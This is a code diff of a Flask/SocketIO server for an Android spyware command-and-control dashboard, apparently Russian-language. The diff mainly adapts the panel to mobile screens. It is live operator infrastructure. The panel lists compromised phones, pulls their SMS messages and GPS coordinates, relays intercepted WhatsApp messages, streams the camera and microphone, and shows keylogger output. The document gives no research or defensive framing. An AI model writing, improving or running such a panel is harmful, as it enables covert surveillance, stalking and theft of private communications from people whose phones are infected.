@@ -12,48 +12,58 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 clients = {}
 camera_frames = {}
 last_seen = {}
-activity_logs = {}
 
 HTML = """
 <!DOCTYPE html>
 <html lang="ru" class="dark">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Dashboard | Android Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>C2 Dashboard | Mobile</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; }
+        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; overflow: hidden; }
         .font-mono { font-family: 'JetBrains Mono', monospace; }
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: #0b0f19; }
-        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #374151; }
-        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: relative; }
-        .sidebar-item { transition: all 0.2s ease; border-left: 3px solid transparent; }
-        .sidebar-item:hover { background-color: #1f2937; border-left-color: #3b82f6; }
-        .sidebar-item.active { background-color: #1f2937; border-left-color: #3b82f6; color: #fff; }
+        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 2px; }
+        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: fixed; top: 0; bottom: 0; left: 0; width: 280px; transform: translateX(-100%); transition: transform 0.3s ease; }
+        .sidebar.open { transform: translateX(0); }
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 90; display: none; }
+        .overlay.active { display: block; }
         .client-row { transition: background-color 0.2s; }
         .client-row:hover { background-color: #1f2937; cursor: pointer; }
         .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
-        .toggle-switch { position: relative; display: inline-block; width: 40px; height: 22px; }
+        .toggle-switch { position: relative; display: inline-block; width: 48px; height: 26px; }
         .toggle-switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 22px; }
-        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 26px; }
+        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
         input:checked + .slider { background-color: #10b981; }
-        input:checked + .slider:before { transform: translateX(18px); }
-        .fade-in { animation: fadeIn 0.3s ease-in-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        input:checked + .slider:before { transform: translateX(22px); }
+        
+        @media (min-width: 768px) {
+            .sidebar { transform: translateX(0); position: relative; }
+            .overlay { display: none !important; }
+            .mobile-header { display: none; }
+            main { margin-left: 0; }
+        }
     </style>
 </head>
-<body class="h-screen overflow-hidden flex">
+<body class="h-screen flex">
+
+    <!-- Overlay for mobile menu -->
+    <div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
 
     <!-- SIDEBAR -->
-    <aside class="sidebar w-72 flex flex-col h-full">
-        <div class="p-4 border-b border-gray-800 flex items-center gap-3">
-            <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
-            <div><h1 class="text-sm font-bold text-white">ANDROID C2</h1><p class="text-[10px] text-gray-500 font-mono">v11.0.0</p></div>
+    <aside class="sidebar flex flex-col h-full" id="sidebar">
+        <div class="p-4 border-b border-gray-800 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
+                <h1 class="text-sm font-bold text-white">ANDROID C2</h1>
+            </div>
+            <button class="md:hidden text-gray-400" onclick="toggleSidebar()"><i class="fa-solid fa-xmark text-xl"></i></button>
         </div>
 
         <div class="flex-1 overflow-y-auto p-2">
@@ -63,21 +73,30 @@ HTML = """
 
         <div id="main-menu" class="hidden border-t border-gray-800 p-2 space-y-1">
             <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider mt-2">Действия</div>
-            <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
-            <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
-            <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
-            <div onclick="switchView('phone-wa')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-brands fa-whatsapp w-4 text-center text-green-500"></i> WhatsApp</div>
-            <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
-            <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
-            <div onclick="switchView('phone-mic')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-microphone w-4 text-center"></i> Microphone</div>
-            <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
-            <div onclick="switchView('keylog')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer"><i class="fa-solid fa-keyboard w-4 text-center"></i> Spy Logs</div>
+            <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
+            <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
+            <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
+            <div onclick="switchView('phone-wa')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-brands fa-whatsapp w-4 text-center text-green-500"></i> WhatsApp</div>
+            <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
+            <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
+            <div onclick="switchView('phone-mic')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-microphone w-4 text-center"></i> Microphone</div>
+            <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
+            <div onclick="switchView('keylog')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-keyboard w-4 text-center"></i> Spy Logs</div>
         </div>
     </aside>
 
     <!-- MAIN CONTENT -->
-    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative">
-        <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
+    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative w-full">
+        
+        <!-- Mobile Header -->
+        <header class="h-14 border-b border-gray-800 flex items-center justify-between px-4 bg-[#111827] md:hidden mobile-header">
+            <button onclick="toggleSidebar()" class="text-gray-300"><i class="fa-solid fa-bars text-xl"></i></button>
+            <h2 id="mobile-title" class="text-sm font-semibold text-gray-300 truncate">C2 Dashboard</h2>
+            <div class="w-6"></div>
+        </header>
+
+        <!-- Desktop Header -->
+        <header class="h-14 border-b border-gray-800 items-center justify-between px-6 bg-[#111827] hidden md:flex">
             <div class="flex items-center gap-4">
                 <h2 id="active-client-name" class="text-sm font-semibold text-gray-300">Выберите клиента</h2>
                 <span id="active-client-ip" class="text-xs font-mono text-green-400"></span>
@@ -88,95 +107,65 @@ HTML = """
             </div>
         </header>
 
-        <div id="view-empty" class="flex-1 flex flex-col items-center justify-center text-gray-600">
-            <i class="fa-solid fa-mobile-screen text-6xl mb-4 opacity-20"></i>
-            <p class="text-sm font-mono">УСТРОЙСТВО НЕ ВЫБРАНО</p>
+        <div id="view-empty" class="flex-1 flex flex-col items-center justify-center text-gray-600 p-4">
+            <i class="fa-solid fa-mobile-screen text-5xl mb-4 opacity-20"></i>
+            <p class="text-sm font-mono text-center">УСТРОЙСТВО НЕ ВЫБРАНО</p>
         </div>
 
-        <div id="view-phone-info" class="hidden flex-1 p-6 overflow-y-auto fade-in">
-            <h2 class="text-lg font-bold text-white mb-6">Информация об устройстве</h2>
-            <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 font-mono text-sm text-gray-300 space-y-2" id="phone-info-data"></div>
+        <!-- Все вьюхи сюда (пример одной) -->
+        <div id="view-phone-info" class="hidden flex-1 p-4 md:p-6 overflow-y-auto">
+            <h2 class="text-lg font-bold text-white mb-4">Информация об устройстве</h2>
+            <div class="bg-[#111827] border border-gray-800 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300 break-words" id="phone-info-data"></div>
         </div>
 
-        <div id="view-phone-sms" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
-            <div class="flex justify-between items-center mb-4 max-w-4xl">
-                <h2 class="text-lg font-bold text-white">SMS Сообщения</h2>
-                <button onclick="dumpData('sms')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить SMS</button>
+        <div id="view-phone-sms" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-lg font-bold text-white">SMS</h2>
+                <button onclick="dumpData('sms')" class="bg-blue-600 text-white px-4 py-2 rounded text-xs md:text-sm">Запросить</button>
             </div>
-            <div id="sms-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
+            <div id="sms-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs md:text-sm whitespace-pre-wrap text-gray-300"></div>
         </div>
 
-        <div id="view-phone-contacts" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
-            <div class="flex justify-between items-center mb-4 max-w-4xl">
-                <h2 class="text-lg font-bold text-white">Контакты</h2>
-                <button onclick="dumpData('contacts')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Запросить Контакты</button>
+        <div id="view-phone-wa" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
+            <h2 class="text-lg font-bold text-white mb-4"><i class="fa-brands fa-whatsapp text-green-500"></i> WhatsApp</h2>
+            <div id="wa-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs md:text-sm whitespace-pre-wrap text-gray-300">Ожидание...</div>
+        </div>
+
+        <div id="view-phone-gps" class="hidden flex-1 p-4 md:p-6 overflow-y-auto flex-col">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-lg font-bold text-white">GPS</h2>
+                <button onclick="dumpData('geo')" class="bg-green-600 text-white px-4 py-2 rounded text-xs md:text-sm">Запросить</button>
             </div>
-            <div id="contacts-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
+            <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono text-sm break-words"></div>
         </div>
 
-        <div id="view-phone-wa" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
-            <h2 class="text-lg font-bold text-white mb-4"><i class="fa-brands fa-whatsapp text-green-500"></i> WhatsApp Логи</h2>
-            <div id="wa-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300">Ожидание сообщений...</div>
-        </div>
-
-        <div id="view-phone-gps" class="hidden flex-1 p-6 overflow-y-auto fade-in flex-col">
-            <div class="flex justify-between items-center mb-4 max-w-4xl">
-                <h2 class="text-lg font-bold text-white">GPS Локация</h2>
-                <button onclick="dumpData('geo')" class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-location-crosshairs"></i> Обновить Гео</button>
-            </div>
-            <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono">Ожидание...</div>
-        </div>
-
-        <div id="view-phone-cam" class="hidden flex-1 p-6 overflow-y-auto fade-in">
+        <div id="view-phone-cam" class="hidden flex-1 p-4 md:p-6 flex-col">
             <div class="flex justify-between items-center mb-4">
                 <h2 class="text-lg font-bold text-white">Камера</h2>
-                <div class="flex gap-4">
-                    <button onclick="switchCamera()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-sync"></i> Сменить</button>
-                    <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
-                        <span class="text-xs text-gray-400">Включить</span>
-                        <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
-                    </div>
+                <div class="flex gap-2">
+                    <button onclick="switchCamera()" class="bg-gray-700 text-white px-3 py-1 rounded text-xs"><i class="fa-solid fa-sync"></i></button>
+                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
                 </div>
             </div>
-            <div class="border border-gray-800 rounded-lg bg-black h-[600px] flex items-center justify-center relative">
-                <img id="cam-img" src="" class="max-h-full max-w-full object-contain hidden">
-                <span id="cam-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
+            <div class="flex-1 border border-gray-800 rounded-lg bg-black flex items-center justify-center relative min-h-[50vh]">
+                <img id="cam-img" src="" class="w-full h-full object-contain hidden">
+                <span id="cam-placeholder" class="text-gray-700 font-mono text-xs">OFFLINE</span>
             </div>
         </div>
 
-        <div id="view-phone-mic" class="hidden flex-1 p-6 overflow-y-auto fade-in">
+        <div id="view-phone-mic" class="hidden flex-1 p-4 md:p-6 flex-col">
             <div class="flex justify-between items-center mb-4">
                 <h2 class="text-lg font-bold text-white">Микрофон</h2>
-                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
-                    <span class="text-xs text-gray-400">Слушать</span>
-                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
-                </div>
+                <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
             </div>
-            <div class="border border-gray-800 rounded-lg bg-black h-[300px] flex flex-col items-center justify-center text-gray-600">
-                <i class="fa-solid fa-headphones text-6xl mb-4 text-green-500/50"></i>
-                <p class="font-mono text-sm">AUDIO STREAM ACTIVE</p>
+            <div class="flex-1 border border-gray-800 rounded-lg bg-black flex items-center justify-center text-gray-600">
+                <i class="fa-solid fa-headphones text-5xl"></i>
             </div>
         </div>
 
-        <div id="view-phone-screen" class="hidden flex-1 p-6 overflow-y-auto fade-in">
-            <div class="flex justify-between items-center mb-4">
-                <h2 class="text-lg font-bold text-white">Экран</h2>
-                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
-                    <span class="text-xs text-gray-400">Включить</span>
-                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('screen', this.checked)"><span class="slider"></span></label>
-                </div>
-            </div>
-            <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
-                <img id="scr-img" src="" class="max-h-full max-w-full object-contain hidden">
-                <span id="scr-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
-            </div>
-        </div>
-
-        <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6 space-y-4">
-            <div class="flex-1 flex flex-col min-h-0">
-                <h2 class="text-sm font-bold text-white mb-2"><i class="fa-solid fa-keyboard text-blue-400 mr-2"></i>Keylogger</h2>
-                <div id="keylog-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm text-green-500 whitespace-pre-wrap break-all"></div>
-            </div>
+        <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
+            <h2 class="text-sm font-bold text-white mb-2">Keylogger</h2>
+            <div id="keylog-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs text-green-500 whitespace-pre-wrap"></div>
         </div>
     </main>
 
@@ -187,11 +176,17 @@ HTML = """
         let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         let lastClientsData = {};
 
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('overlay').classList.toggle('active');
+        }
+
         setInterval(() => {
             if (currentClientId && lastClientsData[currentClientId]) {
                 const c = lastClientsData[currentClientId];
                 const up = Math.floor(Date.now() / 1000 - c.connected_at);
-                document.getElementById('active-client-uptime').innerText = `В сети: ${formatUptime(up)}`;
+                const el = document.getElementById('active-client-uptime');
+                if (el) el.innerText = `В сети: ${formatUptime(up)}`;
             }
         }, 1000);
 
@@ -199,8 +194,7 @@ HTML = """
             if (seconds < 60) return `${seconds} сек`;
             const m = Math.floor(seconds / 60);
             if (m < 60) return `${m} мин`;
-            const h = Math.floor(m / 60);
-            return `${h} ч ${m % 60} мин`;
+            return `${Math.floor(m / 60)} ч ${m % 60} мин`;
         }
 
         socket.on('update_clients', (data) => {
@@ -210,26 +204,31 @@ HTML = """
             for (let id in data) {
                 const c = data[id];
                 const div = document.createElement('div');
-                div.className = `client-row flex items-center justify-between px-3 py-2 rounded text-xs border border-transparent ${currentClientId === id ? 'selected border-blue-800' : ''}`;
+                div.className = `client-row p-3 rounded border border-transparent ${currentClientId === id ? 'selected border-blue-800' : ''}`;
                 div.innerHTML = `
-                    <div class="flex flex-col gap-1">
-                        <span class="font-bold text-gray-200">${c.user}</span>
-                        <span class="font-mono text-[10px] text-gray-500">${c.ip}</span>
+                    <div class="flex justify-between items-center">
+                        <span class="font-bold text-sm text-gray-200">${c.user}</span>
+                        <div class="w-2 h-2 rounded-full bg-green-500"></div>
                     </div>
-                    <div class="flex flex-col items-end gap-1">
-                        <span class="text-[10px] text-gray-400">${formatUptime(Math.floor(Date.now()/1000 - c.connected_at))}</span>
-                        <div class="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_5px_#10b981]"></div>
-                    </div>
+                    <div class="text-[10px] text-gray-500 font-mono">${c.ip} | ${formatUptime(Math.floor(Date.now()/1000 - c.connected_at))}</div>
                 `;
-                div.onclick = () => selectClient(id, c);
+                div.onclick = () => {
+                    selectClient(id, c);
+                    if (window.innerWidth < 768) toggleSidebar();
+                };
                 list.appendChild(div);
             }
         });
 
         function selectClient(id, data) {
             currentClientId = id;
-            document.getElementById('active-client-name').innerText = data.user;
-            document.getElementById('active-client-ip').innerText = data.ip;
+            const title = document.getElementById('active-client-name');
+            const ip = document.getElementById('active-client-ip');
+            const mtitle = document.getElementById('mobile-title');
+            if (title) title.innerText = data.user;
+            if (ip) ip.innerText = data.ip;
+            if (mtitle) mtitle.innerText = data.user;
+            
             document.getElementById('view-empty').classList.add('hidden');
             document.getElementById('main-menu').classList.remove('hidden');
             switchView('phone-info');
@@ -239,9 +238,11 @@ HTML = """
         function switchView(view) {
             if (!currentClientId) return;
             document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
-            document.getElementById(`view-${view}`).classList.remove('hidden');
-            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
-            if (event && event.currentTarget) event.currentTarget.classList.add('active');
+            const target = document.getElementById(`view-${view}`);
+            if (target) {
+                target.classList.remove('hidden');
+                target.classList.add('flex');
+            }
         }
 
         function toggleFeature(feature, state) { 
@@ -249,7 +250,7 @@ HTML = """
             if (feature === 'camera') {
                 const img = document.getElementById('cam-img');
                 if (state) {
-                    img.src = `/video_feed/${currentClientId}`;
+                    img.src = `/video_feed/${currentClientId}?t=${new Date().getTime()}`;
                     img.classList.remove('hidden');
                     document.getElementById('cam-placeholder').classList.add('hidden');
                 } else {
@@ -263,8 +264,6 @@ HTML = """
         function switchCamera() { socket.emit('switch_camera', {client_id: currentClientId}); }
         function dumpData(type) { socket.emit('cmd_dump', {client_id: currentClientId, type}); }
 
-        socket.on('phone_screen', (d) => { if (d.client_id === currentClientId) { const i = document.getElementById('scr-img'); i.src = 'data:image/jpeg;base64,' + d.img; i.classList.remove('hidden'); document.getElementById('scr-placeholder').classList.add('hidden'); } });
-        
         socket.on('phone_mic', (d) => {
             if (d.client_id !== currentClientId) return;
             const binary = atob(d.data); const bytes = new Uint8Array(binary.length);
@@ -278,14 +277,13 @@ HTML = """
         socket.on('phone_data', (d) => {
             if (d.client_id !== currentClientId) return;
             if (d.type === 'sms') document.getElementById('sms-list').innerText = JSON.stringify(d.payload, null, 2);
-            if (d.type === 'contacts') document.getElementById('contacts-list').innerText = JSON.stringify(d.payload, null, 2);
             if (d.type === 'geo') document.getElementById('gps-data').innerHTML = `<a href="https://www.google.com/maps?q=${d.payload.lat},${d.payload.lon}" target="_blank" class="text-blue-400 hover:underline"><i class="fa-solid fa-map-location-dot mr-2"></i>${d.payload.lat}, ${d.payload.lon}</a>`;
         });
 
         socket.on('whatsapp_msg', (d) => {
             if (d.client_id !== currentClientId) return;
             const el = document.getElementById('wa-list');
-            if (el.innerText === 'Ожидание сообщений...') el.innerText = '';
+            if (el.innerText === 'Ожидание...') el.innerText = '';
             el.innerText += `[${d.time}] ${d.text}\n`;
             el.scrollTop = el.scrollHeight;
         });
@@ -300,7 +298,6 @@ HTML = """
 </html>
 """
 
-# Фоновая очистка мертвых клиентов (если не слали пинг более 2 минут)
 def cleanup_loop():
     while True:
         now = time.time()
@@ -325,18 +322,6 @@ def video_feed(cid):
                 yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             time.sleep(0.1)
     return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
-# Ручное удаление
-@app.route('/unregister/<cid>', methods=['GET', 'POST'])
-def unregister(cid):
-    if cid in clients: del clients[cid]
-    if cid in last_seen: del last_seen[cid]
-    if cid in camera_frames: del camera_frames[cid]
-    socketio.emit('update_clients', clients)
-    return "OK"
-
-@socketio.on('connect')
-def handle_connect(): socketio.emit('update_clients', clients)
 
 @socketio.on('register_client')
 def handle_register(data):
@@ -365,9 +350,6 @@ def handle_dump(data): socketio.emit('cmd_dump', data)
 
 @socketio.on('phone_data')
 def handle_phone_data(data): socketio.emit('phone_data', data)
-
-@socketio.on('phone_screen')
-def handle_phone_screen(data): socketio.emit('phone_screen', data)
 
 @socketio.on('phone_mic')
 def handle_phone_mic(data): socketio.emit('phone_mic', data)
